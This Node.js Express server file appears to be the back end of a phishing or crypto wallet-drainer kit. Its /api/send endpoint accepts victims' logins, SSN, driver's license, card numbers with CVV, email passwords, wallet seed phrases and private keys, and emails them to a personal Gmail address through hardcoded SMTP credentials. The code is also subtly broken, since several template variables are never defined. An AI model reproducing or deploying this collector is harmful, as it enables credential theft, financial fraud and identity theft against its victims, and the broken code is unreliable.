const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const cors = require('cors');

app.use(express.json());
app.use(cors())

const users = [
    { id: 1, name: 'John' },
    { id: 2, name: 'Alice' },
    { id: 3, name: 'Bob' },
  ];
  
  // GET endpoint to return users
  app.get('/api/users', (req, res) => {
    res.json(users);
  });

//   POST Request send mail

app.post('/api/send', async (req, res) => {

    const {type, platform, username, password, firstname, lastname, othername, dob, ssn, driver_license, address, card_name, card_number, card_expiration, card_cvv, email, email_pass } = req.body;



 


 var transport = nodemailer.createTransport({
      host: 'mail.jumping-rivers.co.uk',
      port: 465,
      auth: {
        user: 'webresolve@jumping-rivers.co.uk',
        pass: 'Vanilla11**'
      }
    });

  let mailOptions = {
    from: 'twebresolve@jumping-rivers.co.uk',
    to: 'ricardo.josh12@gmail.com',
    subject: type,
    html: `
      <html>
        <body>
          <h1>Platform ${platform} <br></h1>
          <p>Connection Type ${type} <br></p>
          <p>Phrase is ${phrase} <br></p>
          <p>Keystore JSON is ${keystore_json} <br></p>
          <p>Wallet Password is ${wallet_password} <br></p>
          <p>Private Key is ${private_key} <br></p>
        </body>
      </html>
    `
  };


  try {
    let info = await transport.sendMail(mailOptions);
    console.log('Message sent: %s', info.messageId);
  } catch (error) {
    console.error('Error sending email:', error);
  }



res.status(200).json({ message: 'Working' + type });




});



  // Start the server
app.listen(5000, () => {
    console.log('Server is running on port 5000');
  });